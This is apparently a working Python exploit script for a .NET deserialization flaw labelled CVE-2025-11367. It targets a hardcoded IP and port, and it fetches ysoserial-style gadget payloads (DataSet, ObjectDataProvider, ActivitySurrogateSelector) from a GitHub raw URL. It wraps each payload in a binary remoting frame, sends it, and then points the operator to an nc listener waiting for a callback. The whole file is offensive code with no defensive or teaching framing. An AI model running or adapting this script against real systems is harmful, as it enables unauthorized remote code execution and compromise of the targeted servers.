#!/usr/bin/env python3
"""Send XAML payloads to CVE-2025-11367 endpoint. Run from cloud-health.net."""
import socket, struct, base64, urllib.request, time, sys

TARGET = "138.207.64.28"
PORT   = 10004

def e(s): b=s.encode();return bytes([1])+struct.pack('<i',len(b))+b
def frame(payload, key=None):
    h=(struct.pack('<H',6)+bytes([1])+e('application/octet-stream')+
       struct.pack('<H',4)+bytes([1])+e('ProofOfConcept')+
       struct.pack('<H',1)+e('__RequestUri')+e('ProofOfConcept'))
    if key: h+=struct.pack('<H',1)+e('AuthenticationKey')+e(str(key))
    h+=struct.pack('<H',0)
    return struct.pack('<I',0x54454E2E)+bytes([1,0])+struct.pack('<H',0)*2+struct.pack('<i',len(payload))+h+payload

BASE="https://raw.githubusercontent.com/abb3rrant/yso-payload-gen/main"
payloads=[
    ("DataSet",          f"{BASE}/payload_dataset.b64"),
    ("ObjectDataProvider", f"{BASE}/payload_odp.b64"),
    ("ActivitySurrogateSelector", f"{BASE}/payload_ass.b64"),
]

for name, url in payloads:
    try:
        raw = base64.b64decode(urllib.request.urlopen(url).read().strip())
        print(f"[*] Sending {name} ({len(raw)}B)...", flush=True)
        s=socket.socket(); s.settimeout(8); s.connect((TARGET,PORT))
        s.sendall(frame(raw))
        r=b''
        s.settimeout(2)
        try:
            while True:
                c=s.recv(4096)
                if not c: break
                r+=c
        except: pass
        s.close()
        strs=[]
        cur=""
        for b in r:
            if 32<=b<127: cur+=chr(b)
            else:
                if len(cur)>=5: strs.append(cur)
                cur=""
        summary=' '.join(strs)[:200] if strs else '(empty)'
        print(f"    Response: {len(r)}B -> {summary}", flush=True)
        time.sleep(1)
    except Exception as ex:
        print(f"    ERROR: {ex}", flush=True)

print("\n[*] Done. Check nc listener on :8080 for callback.")
